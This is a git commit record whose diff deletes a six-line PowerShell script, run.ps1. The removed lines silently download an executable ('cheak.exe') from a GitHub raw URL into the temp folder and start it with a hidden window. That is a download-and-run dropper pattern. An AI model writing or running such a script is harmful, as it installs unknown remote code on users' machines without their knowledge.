288f5f355ab5e469f29751ce390664fbeb563d63
tibizda068-collab <tibizda068@gmail.com>
2026-06-16 00:43:38 +0300

    Delete run.ps1

--- run.ps1
+++
@@ -1,6 +0,0 @@
-$ProgressPreference = 'SilentlyContinue'
-$url = "https://raw.githubusercontent.com/tibizda068-collab/rust/main/cheak.exe"
-$path = "$env:TEMP\cheak.exe"
-
-irm $url -OutFile $path -UseBasicParsing
-Start-Process $path -WindowStyle Hidden
